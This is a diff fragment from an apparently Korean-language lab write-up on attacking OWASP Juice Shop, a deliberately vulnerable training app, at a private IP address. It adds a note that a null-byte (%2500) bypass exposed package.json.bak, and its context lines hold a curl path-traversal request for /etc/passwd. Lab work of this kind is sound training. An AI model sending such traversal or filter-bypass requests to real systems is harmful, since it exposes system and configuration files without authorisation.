@@ -362,6 +362,9 @@ curl -s http://10.20.30.80:3000/ftp/eastere.gg
 
 **Step 3: 경로 탐색 공격**
 
+> **검증 완료:** Null byte(`%2500`) 우회로 package.json.bak 파일 내용 접근 성공.
+> JuiceShop v6.2.0-SNAPSHOT 버전 정보 노출 확인.
+
 ```bash
 # 기본 경로 탐색 시도
 curl -s http://10.20.30.80:3000/ftp/../../etc/passwd
